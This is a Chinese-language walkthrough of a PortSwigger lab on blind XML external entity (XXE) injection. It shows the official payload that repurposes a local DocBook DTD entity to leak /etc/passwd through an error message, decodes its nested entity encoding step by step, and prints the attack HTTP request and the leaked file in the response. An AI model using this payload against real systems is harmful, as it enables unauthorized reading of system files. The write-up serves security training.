
教學:
https://www.freebuf.com/articles/web/330086.html

http://www.neversec.top/20190710/2019GoogleCTF-web-bnv.html

https://cloud.tencent.com/developer/article/1464774


```
This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, trigger an error message containing the contents of the `/etc/passwd` file.

You'll need to reference an existing DTD file on the server and redefine an entity from it.

#### Hint

Systems using the GNOME desktop environment often have a DTD at `/usr/share/yelp/dtd/docbookx.dtd` containing an entity called `ISOamso.`







這個實驗室有一個“檢查庫存”功能，它解析 XML 輸入但不顯示結果。

要解決實驗室問題，請觸發包含 `/etc/passwd` 文件內容的錯誤消息。

您需要引用服務器上現有的 DTD 文件並從中重新定義實體。

＃＃＃＃ 暗示

使用 GNOME 桌面環境的系統通常在 `/usr/share/yelp/dtd/docbookx.dtd` 有一個 DTD，其中包含一個名為 `ISOamso` 的實體。













```




官方payload:
```
<!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> <!ENTITY % ISOamso ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error; '> %local_dtd; ]>
```



分析這段代碼，先用sublime 存成 xml 會比較好。因為有代碼高亮，也比較整齊。

```xml



<!DOCTYPE message [

    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">



    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">

        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        
        &#x25;eval;
        &#x25;error;



    '>




    %local_dtd;
]>





```

html編碼

```

&#x25; =  %

&#x26; = &

&#x27; = '


```




1.變數 local_dtd 請求本地文件   (第一層不用編碼)
```
file:///usr/share/yelp/dtd/docbookx.dtd
```


2.定義 ISOamso 字串變數這比較複雜，由於是字串需要編碼
```
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">

<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">

&#x25;eval;
&#x25;error;

```


簡單來說定義了兩個變數 file 和 eval 
```
file 請求 file:///etc/passwd
```


eval 又是一個字串變數又需要再編碼
```
<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>
```


eval字串 定義了一個 error變數
這邊先來看一下巧妙的地方

```
&#x26; 第一次解碼會變成 &
&#x27; 第一次解碼會變成 '
&#x25; 第一次解碼會變成 %

```

```
所以第一次解碼時:
注意到了嗎 (& 和 #x25; 結和成了 &#x25)
<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>
```

懂了payload 編碼後 我們在總結一次



程式碼開始解釋:
1.定義變數 local_dtd 請求 docbookx.dtd 檔


2.定義ISOamso字串變數 已經被解碼成
```
<!ENTITY % file SYSTEM "file:///etc/passwd">


<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">

%eval;
%error;
```


3.調用local_dtd 變數，加載到了 docbookx.dtd


4.docbookx.dtd 裡面有一個 ISOamso 變數 ，會調用 eval 字串變數


5.eval 字串變數 定義了 error 變數 (解碼)


6.error 變數
```
<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>
```


7.error 變數被調用 請求
```
file:///nonexistent/file:///etc/passwd
```



抓包丟上payload。
```http

POST /product/stock HTTP/1.1
Host: 0a9a00bf0356dd1fc0780cea005100d3.web-security-academy.net
Cookie: session=e3zLVNf3obz6SEmQnWEsva0N7rq5JGUI
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: */*
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://0a9a00bf0356dd1fc0780cea005100d3.web-security-academy.net/product?productId=3
Content-Type: application/xml
Content-Length: 515
Origin: https://0a9a00bf0356dd1fc0780cea005100d3.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE message [

    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">



    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">

        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        
        &#x25;eval;
        &#x25;error;



    '>




    %local_dtd;
]>


<stockCheck><productId>3</productId><storeId>1</storeId></stockCheck>



```

response:
```http

HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 1359

"XML parser exited with error: java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin (No such file or directory)"
```





這種路徑報錯出訊息的原理，我也不是很懂


只能說以後遇到這種只要專注在寫 ISOamso 這個地方。

遇到這題真的涼涼。